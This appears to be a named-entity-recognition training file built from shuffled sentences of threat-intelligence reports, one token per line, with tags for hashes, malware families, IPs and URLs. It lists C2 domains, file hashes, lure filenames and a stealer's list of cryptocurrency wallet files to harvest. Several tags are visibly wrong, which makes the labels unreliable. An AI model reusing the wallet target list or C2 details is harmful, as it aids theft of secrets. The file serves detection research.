210.253.101.105.7506	B-ip.unknown
|	O
210.253.96.0/20	B-ip.unknown
|	O
INTERQ	O
|	O
JP	O
|	O
GMO.JP	O
|	O
GMO	O
INTERNET	O
INC	O
.	O

The	O
controller	O
downloads	O
the	O
victim	O
profiles	O
from	O
the	O
server	O
.	O

5	O
.	O

Lists	O
of	O
passive	O
DNS	O
entries	O
for	O
horizons-tourisme.com	B-url.normal
and	O
gezelimmi.com	B-url.unknown
can	O
be	O
found	O
below	O
.	O

Cursory	O
online	O
searches	O
failed	O
to	O
disclose	O
what	O
,	O
if	O
anything	O
Cdto	O
might	O
be	O
associated	O
with	O
.	O

But	O
the	O
client	O
is	O
only	O
half	O
of	O
the	O
remote	O
access	O
tool	O
(	O
RAT	O
)	O
—and	O
not	O
likely	O
the	O
part	O
that	O
would	O
appear	O
on	O
a	O
targeted	O
network	O
.	O

By	O
performing	O
manual	O
and	O
programmatic	O
analysis	O
of	O
sandbox	O
data	O
in	O
conjunction	O
with	O
identifying	O
behaviors	O
which	O
are	O
associated	O
with	O
malicious	O
activity	O
,	O
even	O
unknown	O
APT	B-malware.unknown
campaigns	O
can	O
be	O
neutralized	O
.	O

This	O
is	O
not	O
significant	O
for	O
this	O
exploit	O
since	O
it	O
returns	O
true	O
for	O
any	O
version	O
between	O
and	O
including	O
Windows	O
XP	O
to	O
Windows	O
10	O
.	O

The	O
code	O
that	O
triggers	O
the	O
vulnerability	O
parses	O
this	O
structure	O
and	O
,	O
for	O
every	O
key	O
and	O
value	O
members	O
,	O
tries	O
to	O
get	O
the	O
respective	O
string	O
object	O
from	O
string	O
constant	O
pool	O
.	O

Figure	O
16	O
.	O

The	O
module	O
's	O
sending	O
routine	O
depends	O
on	O
the	O
following	O
files	O
in	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O

The	O
human	O
and	O
systemic	O
weaknesses	O
that	O
allow	O
an	O
attacker	O
to	O
compromise	O
an	O
organization	O
can	O
be	O
minimized	O
and	O
mitigated	O
with	O
correct	O
practices	O
and	O
solutions	O
.	O

Understanding	O
the	O
contents	O
of	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
and	O
what	O
its	O
traffic	O
looks	O
like	O
allows	O
researchers	O
to	O
detect	O
this	O
pest	O
both	O
at	O
the	O
network	O
and	O
the	O
host	O
level	O
.	O

Botnet	O
at	O
large	O
:	O
Avast	O
blocks	O
Smominru	O
miner	O

checkFMServer	O
:	O
]	O

Regardless	O
of	O
sophistication	O
,	O
these	O
threats	O
may	O
support	O
future	O
belligerents	O
who	O
have	O
or	O
will	O
eventually	O
possess	O
the	O
capability	O
and	O
intent	O
to	O
disrupt	O
critical	O
business	O
operations	O
.	O

Finally	O
,	O
delete	O
the	O
temporary	O
file	O
%	O
windir%\Temp\temp.bin	O
.	O

Company/Project/Organization	O
Postion	O
Time	O

The	O
URL	O
is	O
similar	O
to	O
that	O
noted	O
in	O
the	O
BadCyber	O
blog	O
,	O
and	O
the	O
use	O
of	O
an	O
XAP	O
file	O
matches	O
what	O
can	O
be	O
found	O
in	O
the	O
Archive.org	O
cache	O
for	O
the	O
sap.misapor[.]ch	O
site	O
.	O

Web	O
.	O

Hypothesis	O
4	O
:	O
A	O
rogue	O
Tranchulas	O
employee	O
used	O
company	O
resources	O
without	O
company	O
knowledge	O
to	O
develop	O
the	O
malware	O
,	O
where	O
an	O
unknown	O
operator	O
later	O
used	O
it	O
offensively	O
.	O

[	O
그림	O
15	O
]	O
Phandoor의	B-malware.backdoor
특징적인	O
문자열	O
(	O
S^	O
)	O
Phandoor가	B-malware.backdoor
실행되면	O
초기화를	O
거쳐	O
C	O
&	O
C	O
서버에	O
접속을	O
시도한다	O
.	O

Function	O
MainCommsLoop_sub_493A30	O
(	O
)	O

You	O
have	O
'	O
UNIQUE_ID_DO_NOT_REMOVE	O
'	O
file	O
on	O
your	O
desktop	O
also	O
it	O
duplicated	O
in	O
some	O
folders	O
,	O
its	O
your	O
unique	O
idkey	O
,	O
attach	O
it	O
to	O
letter	O
when	O
contact	O
with	O
us	O
.	O

RAT	B-malware.backdoor
component	O

Figure	O
18	O
:	O
Results	O
of	O
multiple	O
AV	O
engine	O
inspections	O
showing	O
the	O
Web	B-malware.ransom
shell	O
comes	O
up	O
clean	O

One	O
specific	O
Cmstar	O
payload	O
that	O
we	O
analyzed	O
used	O
the	O
character/offsets	O
seen	O
in	O
Figure	O
1	O
to	O
locate	O
the	O
API	O
functions	O
within	O
three	O
different	O
Windows	O
libraries	O
to	O
build	O
its	O
IAT	O
.	O

InitialCommands	O
:	O
78537844	O
...	O
[	O
]	O
...	O
000000	O
BYTES	O

As	O
shown	O
in	O
Figure	O
23	O
,	O
the	O
client	O
initiates	O
the	O
connection	O
over	O
TCP	O
port	O
80	O
using	O
the	O
HTTP	O
POST	O
method	O
.	O

028caf3b1f5174ae092ecf435c1fccc2	B-hash
7732d5349a0cfa1c3e4bcfa0c06949e4	B-hash
9909f8558209449348a817f297429a48	B-hash
63698ddbdff5be7d5a7ba7f31d0d592c	B-hash
7c4e60685203b229a41ae65eba1a0e10	B-hash
e2112439121f8ba9164668f54ca1c6af	B-hash
784b6e13f195236304e1c172dcdab51f	B-hash
b0f0350a5c2480d8419d14ec3445b765	B-hash
9a51db9889d4fd6d02bdb35bd13fb07e	B-hash
8199667bad5559ee8f04fd6b1a587a75	B-hash
7ad6aaa107a7616a3dbe8e3babf5d310	B-hash

The	O
cybercriminals	O
behind	O
the	O
Tempting	B-malware.infosteal
Cedar	I-malware.infosteal
Spyware	I-malware.infosteal
were	O
able	O
to	O
install	O
a	O
persistent	O
piece	O
of	O
spyware	O
by	O
exploiting	O
social	O
media	O
,	O
like	O
Facebook	O
,	O
and	O
people	O
's	O
lack	O
of	O
security	O
awareness	O
,	O
and	O
were	O
thus	O
able	O
to	O
gather	O
sensitive	O
and	O
private	O
data	O
from	O
their	O
victims	O
'	O
phones	O
including	O
real-time	O
location	O
data	O
which	O
makes	O
the	O
malware	O
exceptionally	O
dangerous	O
.	O

A	O
document	O
purporting	O
to	O
be	O
from	O
the	O
Institute	O
for	O
Development	O
and	O
Research	O
in	O
Banking	O
Technology	O
(	O
established	O
by	O
the	O
Reserve	O
Bank	O
of	O
India	O
)	O
is	O
shown	O
in	O
Figure	O
7	O
.	O

Symantec	O
,	O
the	O
Symantec	O
Logo	O
,	O
and	O
the	O
Checkmark	O
Logo	O
are	O
trademarks	O
or	O
registered	O
trademarks	O
of	O
Symantec	O
Corporation	O
or	O
its	O
affiliates	O
in	O
the	O
U.S.	O
and	O
other	O
countries	O
.	O

The	O
screenshot	O
below	O
is	O
indicative	O
of	O
typical	O
message	O
content	O
:	O
The	O
attachments	O
to	O
the	O
e-mails	O
we	O
have	O
been	O
able	O
to	O
analyze	O
were	O
typically	O
.rar	O
files	O
,	O
which	O
we	O
found	O
to	O
contain	O
malware	O
.	O

ASN	O
and	O
Hosting	O
provider	O

7b4a8be258ecb191c4c519d7c486ed8a	B-hash
)	O
is	O
identical	O
to	O
the	O
one	O
reported	O
in	O
a	O
malware	O
traffic	O
analysis	O
blog	O
post	O
from	O
March	O
2016	O
where	O
it	O
was	O
used	O
to	O
deliver	O
Qbot	O
.	O

The	O
files	O
found	O
are	O
packed	O
in	O
an	O
archive	O
,	O
which	O
is	O
then	O
scheduled	O
for	O
upload	O
to	O
the	O
C	O
&	O
C	O
using	O
the	O
FMGR	O
module	O
.	O

https://twitter.com/MoayyadAyesh	B-url.normal
https://www.facebook.com/profile.php?id=100012034095150	B-url.normal

However	O
,	O
it	O
seems	O
like	O
the	O
malware	O
authors	O
underestimated	O
the	O
spreading	O
capabilities	O
of	O
Diskcoder.C	O
.	O

The	O
Guardian	O
.	O

The	O
group	O
's	O
campaigns	O
appear	O
to	O
have	O
been	O
active	O
since	O
at	O
least	O
2005	O
,	O
while	O
the	O
very	O
first	O
sample	O
found	O
points	O
to	O
2001	O
.	O

Vulnerability	O
Spotlight	O
:	O
Multiple	O
Adobe	O
Acrobat	O
DC	O
...	O
Threat	O
Roundup	O
for	O
June	O
29	O
to	O
July	O
Smoking	O
Guns	O
-	O
Smoke	O
Loader	O
learned	O
new	O
tricks	O
(	O
15	O
)	O
(	O
15	O
)	O
(	O
21	O
)	O
(	O
10	O
)	O
(	O
14	O
)	O
(	O
18	O
)	O
(	O
172	O
)	O
(	O
98	O
)	O
(	O
62	O
)	O
(	O
67	O
)	O
(	O
30	O
)	O
(	O
53	O
)	O
(	O
23	O
)	O
(	O
93	O
)	O
(	O
146	O
)	O
(	O
37	O
)	O

At	O
least	O
one	O
targeted	O
individual	O
activated	O
links	O
to	O
malware	O
hosted	O
on	O
operational	O
infrastructure	O
of	O
opened	O
attachments	O
containing	O
malware	O
.	O

The	O
other	O
functions	O
return	O
hardcoded	O
values	O
that	O
serve	O
no	O
real	O
purpose	O
.	O

Какая	O
реформа	O
армии	O
нужна	O
Украине	O
.doc	O
(	O
What	O
is	O
needed	O
reform	O
of	O
the	O
army	O
Ukraine.doc	O
)	O
MD5	O
:	O
76ffb9c2d8d0ae46e8ea792ffacc8018	B-hash
SHA256	O
:	O
c26c67eac20614038aaadfda19b604862926433333893d65332928b5e36796aa	B-hash
Type	O
:	O
MIME	O
entity	O
text	O
Toolkit	O
:	O
MNKit	O
Author	O
:	O
User123	O
Last	O
Saved	O
By	O
:	O
User123	O
Created	O
:	O
2012-05-01T14:08:00Z	O
Modified	O
:	O
2012-05-01T14:12:00Z	O
запуск	O
ракеты	O
-	O
носителя	O
Союз	O
.doc	O
(	O
launch	O
of	O
the	O
carrier	O
rocket	O
Soyuz.doc	O
)	O
MD5	O
:	O
6fdeadacfe1dafd2293ce5c4e178b668	B-hash
SHA256	O
:	O
e39b0e777ef0135c1f737b67988df70c2e6303c3d2b01d3cdea3efc1d03d9ad9	B-hash
сельское	O
_	O
хозяйство	O
.doc	O
(	O
RF	O
China	O
Agriculture	O
and	O
Economy.doc	O
)	O
MD5	O
:	O
9da10a36daf845367e0fc2f3e7e54336	B-hash
SHA256	O
:	O
a0aeb172a72442d2c2c02e1d32b48accb9975c4da7742df24d9350a8ccd401f2	B-hash
Ерөнхий	O
сайд	O
асан	O
Н.Алтанхуягийг	O
шалгаж	O
эхэлжээ	O
.doc	O
(	O
Former	O
Prime	O
Minister	O
started	O
to	O
check	O
with	O
their	O
lethargy.doc	O
)	O
MD5	O
:	O
f7d47e1de4f5f4ad530bca0fc080ea53	B-hash
SHA256	O
:	O
4883286b8229a2c43db17eb1e1c5bd79d1933e840cdfedff80d5b99a84c9e39f	B-hash
запуск	O
ракеты	O
-	O
носителя	O
Союз	O
.doc	O
(	O
launch	O
of	O
the	O
carrier	O
rocket	O
Soyuz.doc	O
)	O
MD5	O
:	O
6fdeadacfe1dafd2293ce5c4e178b668	B-hash
SHA256	O
:	O
e39b0e777ef0135c1f737b67988df70c2e6303c3d2b01d3cdea3efc1d03d9ad9	B-hash
MD5	O
:	O
5aeb8a5aa8f6e2408016cbd13b3dfaf0	B-hash
SHA256	O
:	O
df34aa9c8021f1f0bdf33249908efc4a9628941453ad79b281b3a46bf9a7f37f	B-hash
Путины	O
урилга	O
.doc	O
(	O
Putin	O
's	O
invitation.doc	O
)	O
SHA256	O
:	O
45027d11ab783993c413f97e8e29759d04b04564f8916f005f5c632f291697bb	B-hash
MD5	O
:	O
46bf922d9ae07a9bc3667a374605bdbb	B-hash
SHA256	O
:	O
7dc78caf515d1d3d2b84be7c023ccbd0b4fd670a42babcbcbd5a5ba65bbdd166	B-hash
Армия	O
-2015.doc	O
(	O
Army-2015.doc	O
)	O
MD5	O
:	O
783a423f5e285269126d0d98f53c795b	B-hash
SHA256	O
:	O
5b338decffe665a2141d1079c32b2d612057d1fdbfddf198cc28003dae7f0516	B-hash
днём	O
70	O
лет	O
победы	O
.doc	O
(	O
Happy	O
70	O
years	O
of	O
victory.doc	O
)	O
MD5	O
:	O
510b3272342765743a202373261c08da	B-hash
SHA256	O
:	O
0a10d7bb317dceccd05d18408fd6b8b12c784910e5f7e035ee22c2c5d7e4cbf5	B-hash
Filename	O
:	O
new	O
resume.doc	O
MD5	O
:	O
c5ae7bd6aec1e01aa53edcf41962ac04	B-hash
SHA256	O
:	O
87bcc6d18c6a81d92d826b232703dee84b522bd1d0cae56f74bcf58fdca0930e	B-hash
MD5	O
:	O
3d41e3c902502c8b0ea30f5947307d56	B-hash
SHA256	O
:	O
b65dd4da9f83c11fcb5beaec43fabd0df0f7cb61de94d874f969ca926e085515	B-hash
Центр	O
-2015.doc	O
(	O
Center-2015.doc	O
)	O
MD5	O
:	O
94499ff857451ab7ef8823bf067189e7	B-hash
SHA256	O
:	O
671dfc4d47a43cf0bd9205a0f654dcd5050175aef54b69388b0c5f4610896c6a	B-hash
Related	O
Cmwhite	B-malware.unknown
Tools	O
MD5	O
:	O
3fff0bf6847d0d056636caef9c3056c3	B-hash
SHA256	O
:	O
13c1d7eb2fd64591e224dec9534d8252f4b91e425e8f047b36605138d15cbf2d	B-hash
C2	O
:	O
stone.timmf.com	B-url.unknown
MD5	O
:	O
30a6c3c7723fe14c4b6960fa3e4e57ba	B-hash
SHA256	O
:	O
ab934c6177be0fdc3b6dfbf21f60ce7837a30e6599dcfb111b43008c75ceb91f	B-hash
C2	O
:	O
xphome.mailru-vip.com	B-url.unknown
C2	O
:	O
error.yandex-pro.com	B-url.unknown
MD5	O
:	O
e0417547ba54b58bb2c8f795bca0345c	B-hash
SHA256	O
:	O
1cf44815f9eb735e095f68c929d5549e0ebc44af9988cccaf1852baeb96bb386	B-hash
C2	O
:	O
dns.thinkttun.com	B-url.unknown
MD5	O
:	O
d05f012c9c1a7fb669a07070be821072	B-hash
SHA256	O
:	O
a37f337d0bc3cebede2039b0a3bd5afd0624e181d2dcc9614d2f7d816b5a7a6b	B-hash
C2	O
:	O
help.redhag.com	B-url.unknown
C2	O
:	O
mssage.hotoicq.com	B-url.unknown
C2	O
:	O
new.hoticq.com	B-url.unknown

The	O
attackers	O
have	O
been	O
using	O
IP	O
address	O
192.52.167.118	B-ip.unknown
since	O
the	O
beginning	O
of	O
January	O
.	O

It	O
was	O
padded	O
with	O
unnecessary	O
null	O
bytes	O
in	O
the	O
overlay	O
section	O
of	O
the	O
file	O
,	O
in	O
order	O
to	O
increase	O
the	O
file	O
size	O
as	O
shown	O
in	O
Figure	O
7	O
.	O

determines	O
if	O
it	O
has	O
access	O
to	O
a	O
file	O
;	O
may	O
be	O
a	O
temp	O
file	O
creation/rename	O
involved	O
collects	O
system	O
related	O
and	O
possibly	O
network	O
related	O
information	O
such	O
as	O
,	O
domains	O
,	O
system	O
information	O
creates	O
a	O
directory	O
closes	O
a	O
file	O
that	O
was	O
opened	O
for	O
writing	O
sets	O
normal	O
attributes	O
on	O
a	O
targeted	O
file	O
,	O
deletes	O
the	O
file	O
,	O
opens	O
the	O
same	O
file	O
name	O
as	O
a	O
binary	O
file	O

After	O
the	O
packet	O
flag	O
,	O
packet	O
length	O
and	O
unzip	O
length	O
have	O
been	O
verified	O
,	O
a	O
working	O
connection	O
is	O
created	O
between	O
the	O
victim	O
and	O
the	O
controller	O
.	O

The	O
spyware	O
persisted	O
as	O
a	O
service	O
and	O
ran	O
after	O
every	O
reboot	O
.	O

2010	O
Different	O
17.10	O
.	O

InjectApp	O
sendEventToPid	O
:	O
]	O

The	O
timeline	O
below	O
outlines	O
the	O
events	O
specific	O
to	O
Mutter	B-malware.backdoor
that	O
we	O
had	O
visibility	O
into	O
.	O

Linking	O
APTs	B-malware.unknown
from	O
2011	O
and	O
2014	O
to	O
an	O
Active	O
Scam	O
Network	O
–	O
Kiel	O
Wadner	O
–	O
https://www.bluecoat.com/security-blog/2014-10-08/linking-apts-2011-and-2014-active-scam-network	B-url.normal

windows	O
windows	O
8	O
wordpress	O
worm	O
youtube	O
zero	O
day	O
zeus	O
zynga	O
404	O

This	O
previously	O
unseen	O
variant	O
of	O
X-Agent	B-malware.infosteal
represents	O
FANCY	O
BEAR	O
's	O
expansion	O
in	O
mobile	O
malware	O
development	O
from	O
iOS-capable	O
implants	O
to	O
Android	O
devices	O
,	O
and	O
reveals	O
one	O
more	O
component	O
of	O
the	O
broad	O
spectrum	O
approach	O
to	O
cyber	O
operations	O
taken	O
by	O
Russia-based	O
actors	O
in	O
the	O
war	O
in	O
Ukraine	O
.	O

TG-4127	B-malware.infosteal
exploited	O
the	O
Hillary	O
for	O
America	O
campaign	O
's	O
use	O
of	O
Gmail	O
and	O
leveraged	O
campaign	O
employees	O
'	O
expectation	O
of	O
the	O
standard	O
Gmail	O
login	O
page	O
to	O
access	O
their	O
email	O
account	O
.	O

Author	O
:	O
Ivona	O
Alexandra	O
Chili	O
–	O
Forensics	O
Engineer	O
,	O
Cyber	O
Threat	O
Intelligence	O
Lab	O

Until	O
2015	O
,	O
Lazarus	O
Group	O
cyber	O
activities	O
primarily	O
focused	O
on	O
South	O
Korean	O
and	O
U.S.	O
governments	O
and	O
financial	O
organizations	O
,	O
including	O
destructive	O
attacks	O
on	O
South	O
Korean	O
banking	O
and	O
media	O
sectors	O
in	O
2013	O
and	O
the	O
highly	O
publicized	O
attack	O
on	O
Sony	O
Pictures	O
Entertainment	O
in	O
2014	O
.	O

The	O
final	O
5-byte	O
sequence	O
looks	O
like	O
F3	O
00	O
00	O
00	O
92	O
0D	O
.	O

Investigators	O
indicated	O
that	O
the	O
actors	O
may	O
have	O
gained	O
access	O
to	O
DCCC	O
systems	O
as	O
early	O
as	O
March	O
.	O

Hardcoded	O
control	O
server	O
URLs	O
.	O

Eleven	O
days	O
after	O
we	O
publicly	O
published	O
'	O
Operation	O
DustySky	B-malware.drop
'	O
,	O
we	O
received	O
the	O
following	O
email	O

'	O
Pawn	O
Storm	O
's	O
Domestic	O
Spying	O
Campaign	O
Revealed	O
;	O
Ukraine	O
and	O
US	O
Top	O
Global	O
Targets	O
.	O
'	O

MyS	O
|	O
0000d720	O
65	O
74	O
74	O
69	O
6e	O
67	O
73	O
00	O
53	O
68	O
61	O
64	O
6f	O
77	O
54	O
65	O
|	O
ettings.ShadowTe	O
|	O
0000d730	O
63	O
68	O
5f	O
52	O
61	O
74	O
2e	O
4d	O
79	O
00	O
41	O
70	O
70	O
6c	O
69	O
63	O
|	O
ch_Rat.My.Applic	O
|	O

Tisone360.com	O
,	O
Visits	O
,	O
and	O
Hacking	O
Team	O
Flash	O
0day	O

Targeting	O
:	O
Because	O
the	O
attacker	O
can	O
selectively	O
serve	O
exploits	O
to	O
the	O
victim	O
,	O
they	O
can	O
limit	O
the	O
attack	O
to	O
intended	O
victims	O
.	O

By	O
using	O
Threat	O
Intelligence	O
Platforms	O
and	O
Feeds	O
such	O
as	O
PassiveTotal	O
,	O
Cyberkov	O
was	O
able	O
to	O
discover	O
more	O
activities	O
and	O
campaigns	O
run	O
by	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
.	O

China	B-malware.backdoor
Chopper	I-malware.backdoor
can	O
also	O
run	O
transparently	O
on	O
both	O
Windows	O
and	O
Linux	O
.	O

The	O
CEO	O
of	O
Tranchulas	O
is	O
Zubair	O
Khan	O
,	O
a	O
Pakistani	O
national	O
and	O
information	O
security	O
executive	O
who	O
has	O
'	O
been	O
researching	O
mainly	O
on	O
[	O
sic	O
]	O
cyber	O
warfare	O
'	O
.	O

FireEye	O
dubbed	O
this	O
new	O
malware	O
family	O
HIGHTIDE	B-malware.backdoor
.	O

6	O
Oct	O
.	O

Self-destructing	O
the	O
executable	O
.	O

During	O
analysis	O
,	O
we	O
observed	O
a	O
code	O
section	O
where	O
a	O
message	O
written	O
in	O
Chinese	O
and	O
hard	O
coded	O
in	O
the	O
script	O
will	O
be	O
printed	O
in	O
the	O
case	O
of	O
an	O
error	O
while	O
connecting	O
to	O
the	O
C2	O
server	O
:	O
The	O
English	O
translation	O
for	O
this	O
message	O
is	O
:	O
'	O
Can	O
not	O
connect	O
to	O
website	O
,	O
please	O
wait	O
for	O
dragon	O
'	O
.	O

This	O
section	O
contains	O
the	O
behavioral	O
analysis	O
of	O
the	O
dropped	O
executable	O
Once	O
the	O
dropped	O
file	O
(	O
officeupdate.exe	O
)	O
is	O
executed	O
the	O
malware	O
drops	O
additional	O
files	O
(	O
googleupdate.exe	O
,	O
malib.dll	O
and	O
msccvs.dll	O
)	O
into	O
the	O
%	O
AllUsersProfile	O
%	O
\Google	O
directory	O
and	O
then	O
executes	O
the	O
dropped	O
googleupdate.exe	O

The	O
path	O
move-to-operational	O
is	O
interesting	O
as	O
well	O
,	O
perhaps	O
implying	O
that	O
IRONGATE	B-malware.backdoor
was	O
not	O
seeking	O
the	O
actual	O
running	O
process	O
,	O
but	O
rather	O
a	O
staging	O
area	O
for	O
code	O
promotion	O
.	O

The	O
attackers	O
appeared	O
to	O
prefer	O
the	O
Google	O
URL	O
shortening	O
service	O
'	O
goog.gl	O
,	O
'	O
however	O
,	O
this	O
could	O
easily	O
change	O
as	O
the	O
attacks	O
evolve	O
.	O

SUMMARY	O
OF	O
KEY	O
FINDINGS	O

b803381535ac24ce7c8fdcf6155566d208dfca63fd66ec71bbc6754233e251f5	B-hash

The	O
three	O
primary	O
encryption	O
loops	O
are	O
colored	O
and	O
marked	O
in	O
Figure	O
1	O
.	O

Value	O
:	O
ServiceDLL	O

003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D9	B-hash
2015-02-17	O
EQUATION	B-malware.unknown
003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D9	B-hash
2015-02-17	O
EQUATION	B-malware.unknown
2014-12-20	O
UNKNOWN	O
ARID	B-malware.unknown
VIPER	I-malware.unknown
2014-12-20	O
ARID	B-malware.unknown
VIPER	I-malware.unknown
2015-01-02	O
MALIICIOUS	O
ARID	B-malware.unknown
VIPER	I-malware.unknown
2015-01-16	O
ARID	B-malware.unknown
VIPER	I-malware.unknown
2015-02-12	O
ARID	B-malware.unknown
VIPER	I-malware.unknown

RtlGetVersion	O
,	O
KeAreAllApcsDisabled	O
,	O
PsGetProcessSessionId	O
,	O
PsGetProcessPeb	O
obtained	O
with	O
their	O
own	O
functions	O

Once	O
executing	O
,	O
the	O
payload	O
will	O
immediately	O
delete	O
the	O
fi	O
rst	O
service	O
and	O
enter	O
stage-two	O
.	O

int	O
nAddend	O
=	O
1000	O
;	O
int	O
nSuffix	O
=	O
-71	O
;	O
int	O
nResult	O
=	O
nSuffix	O
+	O
nAddend	O
;	O
for	O
(	O
int	O
k=0	O
;	O
k	O
<	O
4	O
;	O
k++	O
)	O
nResult	O
+=	O
1	O
;	O
sprintf	O
(	O
suffix	O
,	O
'	O
%	O
d	O
'	O
,	O
--	O
nResult	O
)	O
;	O

The	O
key	O
for	O
decryption	O
is	O
hardcoded	O
in	O
the	O
malicious	O
samples	O
.	O

This	O
handle	O
value	O
is	O
invalid	O
:	O
all	O
the	O
windows	O
kernel	O
handle	O
values	O
are	O
by	O
design	O
a	O
multiple	O
of	O
4	O
.	O

–	O
Wallet.dat	O
–	O
UTC–	O
–	O
Etherenum	O
keystore	O
filename	O
–	O
*bitcoin*.txt	O
*.txt	O
–	O
'	O
Bitcoin	O
'	O
–	O
*monero*.txt	O
*.txt	O
–	O
'	O
Monroe	O
Coin	O
'	O
–	O
*litecoin*.txt	O
*.txt	O
–	O
'	O
Litecoin	O
'	O
–	O
*Ethereum*.txt	O
*.txt	O
–	O
'	O
Ethereum	O
'	O
–	O
*miner*.txt	O
*.txt	O
–	O
'	O
Mining	O
'	O
–	O
*blockchain*.txt	O
–	O
*coinbase*	O

When	O
sending	O
the	O
information	O
,	O
ANEL	B-malware.backdoor
encrypts	O
the	O
data	O
using	O
blowfish	O
,	O
XOR	O
,	O
and	O
Base64-based	O
encryption	O
methods	O
.	O

Among	O
these	O
shared	O
features	O
,	O
we	O
can	O
cite	O
the	O
following	O
:	O
At	O
the	O
very	O
beginning	O
of	O
Dino	B-malware.backdoor
execution	O
,	O
the	O
current	O
process	O
name	O
is	O
checked	O
against	O
process	O
names	O
used	O
by	O
some	O
sandboxes	O
:	O
A	O
very	O
similar	O
check	O
(	O
against	O
'	O
klavme	O
'	O
,	O
'	O
myapp	O
'	O
,	O
'	O
TESTAPP	O
'	O
and	O
'	O
afyjevmv.exe	O
'	O
)	O
is	O
present	O
in	O
Bunny	B-malware.unknown
samples	O
,	O
and	O
in	O
some	O
first­stage	O
implants	O
deployed	O
by	O
Animal	O
Farm	O
.	O

Since	O
1979	O
,	O
Iran	O
's	O
reactions	O
to	O
perceived	O
Middle	O
Eastern	O
adversaries	O
'	O
foreign	O
policy	O
has	O
been	O
a	O
study	O
in	O
the	O
use	O
of	O
proxies	O
.	O

The	O
malware	O
in	O
this	O
attack	O
has	O
the	O
ability	O
to	O
replace	O
the	O
Master	O
Boot	O
Record	O
(	O
MBR	O
)	O
with	O
its	O
own	O
malicious	O
code	O
.	O

Analysis	O
While	O
the	O
analysis	O
below	O
discloses	O
the	O
capabilities	O
of	O
the	O
spotted	O
malware	O
,	O
we	O
are	O
pretty	O
sure	O
it	O
is	O
part	O
of	O
a	O
multi-staged	O
attack	O
that	O
targets	O
very	O
specific	O
victims	O
.	O

Even	O
when	O
their	O
campaign	O
was	O
exposed	O
,	O
the	O
attackers	O
did	O
not	O
give	O
up	O
.	O

As	O
you	O
can	O
see	O
from	O
the	O
diagram	O
,	O
it	O
is	O
not	O
known	O
which	O
malicious	O
program	O
interacted	O
with	O
the	O
following	O
three	O
drivers	O
:	O
rndismpc.sys	O
,	O
rtniczw.sys	O
and	O
jmidebs.sys	O
.	O

Code	O
execution	O
with	O
minimal	O
interaction	O
:	O
The	O
vulnerabilities	O
used	O
in	O
zero-day	O
exploits	O
typically	O
trigger	O
with	O
little	O
or	O
no	O
user	O
interaction	O
other	O
than	O
opening	O
the	O
document	O
.	O

dns.exe	O

The	O
attackers	O
identified	O
infected	O
machines	O
in	O
the	O
business	O
sector	O
and	O
followed	O
the	O
tracks	O
to	O
see	O
what	O
else	O
they	O
might	O
be	O
able	O
to	O
get	O
from	O
the	O
companies	O
.	O

GUID	O
:	O
12FEB4A9EEDEE411B283000C29FD2872	O
BYTES	O

Comment	O
Name	O
*	O
Email	O
*	O
Please	O
enter	O
an	O
answer	O
in	O
digits	O
:	O
13	O
+	O
16	O
=	O
Close	O
Menu	O
Business	O
Consumer	O
Executive	O
Perspectives	O
McAfee	O
Partners	O
McAfee	O
Labs	O
Languages	O

The	O
U.S.	O
Government	O
is	O
referring	O
to	O
this	O
malicious	O
cyber	O
activity	O
by	O
RIS	O
as	O
GRIZZLY	O
STEPPE	O
.	O

In	O
the	O
resulting	O
data	O
after	O
NOT	O
operation	O
,	O
the	O
XOR	O
key	O
is	O
\x30\x30\x34\x31	O
.	O

The	O
government	O
does	O
its	O
best	O
to	O
compartmentalize	O
—	O
one	O
job	O
might	O
be	O
creating	O
a	O
remote	O
code	O
exploit	O
(	O
RCE	O
)	O
for	O
a	O
popular	O
software	O
application	O
,	O
while	O
another	O
job	O
might	O
be	O
using	O
the	O
RCE	O
and	O
establishing	O
persistent	O
unauthorized	O
access	O
.	O

Exploit	O
Document	O
MD5	O
:	O

Number	O
of	O
object	O
files	O
,	O
Red	O
October	O
Fileputexec	O
plugin	O

Encryption	O
The	O
scrambled	O
byte	O
sequence	O
is	O
passed	O
onto	O
the	O
constructor	O
of	O
the	O
class	O
Packet	O
:	O
:Packet	O
,	O
which	O
creates	O
a	O
random	O
AES256	O
key	O
and	O
encrypts	O
the	O
buffer	O
with	O
this	O
key	O
.	O

Promotional	O
materials	O
have	O
been	O
leaked	O
that	O
describe	O
the	O
tools	O
as	O
providing	O
a	O
wide	O
range	O
of	O
intrusion	O
and	O
monitoring	O
capabilities	O
.	O

Certain	O
pages	O
within	O
the	O
domain	O
would	O
load	O
the	O
legitimate	O
Ynet	O
website	O
:	O
Others	O
,	O
which	O
are	O
opened	O
as	O
decoy	O
during	O
malware	O
infection	O
,	O
had	O
copied	O
content	O
from	O
a	O
different	O
news	O
site	O
:	O
The	O
URL	O
ynetnewes[.]com/video/Newfilm.html	B-url.normal
contained	O
an	O
article	O
about	O
Brad	O
Pitt	O
and	O
Marion	O
Cotillard	O
copied	O
from	O
another	O
site	O
.	O

It	O
is	O
noteworthy	O
that	O
in	O
most	O
of	O
the	O
cases	O
the	O
same	O
submitters	O
uploaded	O
samples	O
belonging	O

Developing	O
such	O
state-of-the-art	O
backdoors	O
requires	O
skillful	O
malware	O
authors	O
,	O
time	O
and	O
resources	O
.	O

We	O
also	O
believe	O
a	O
separate	O
third	O
group	O
is	O
using	O
these	O
TTPs	O
but	O
we	O
do	O
not	O
have	O
sufficient	O
insight	O
to	O
this	O
operator	O
at	O
this	O
time	O
.	O

An	O
example	O
of	O
this	O
hardening	O
can	O
be	O
seen	O
with	O
Google	O
's	O
Chrome	O
Browser	O
v.55	O
,	O
which	O
outright	O
blocks	O
Flash	O
by	O
default	O
.	O

As	O
we	O
have	O
seen	O
in	O
other	O
targeted	O
campaigns	O
,	O
social	O
engineering	O
and	O
carefully	O
crafted	O
spear­phishing	O
attacks	O
play	O
a	O
crucial	O
role	O
in	O
the	O
effectiveness	O
of	O
getting	O
a	O
foothold	O
in	O
the	O
desired	O
system	O
.	O

In	O
2014	O
,	O
APT32	B-malware.infosteal
leveraged	O
a	O
spear-phishing	O
attachment	O
titled	O
'	O
Plans	O
to	O
crackdown	O
on	O
protesters	O
at	O
the	O
Embassy	O
of	O
Vietnam.exe	O
,	O
'	O
which	O
targeted	O
dissident	O
activity	O
among	O
the	O
Vietnamese	O
diaspora	O
in	O
Southeast	O
Asia	O
.	O

case	O
't	O
'	O
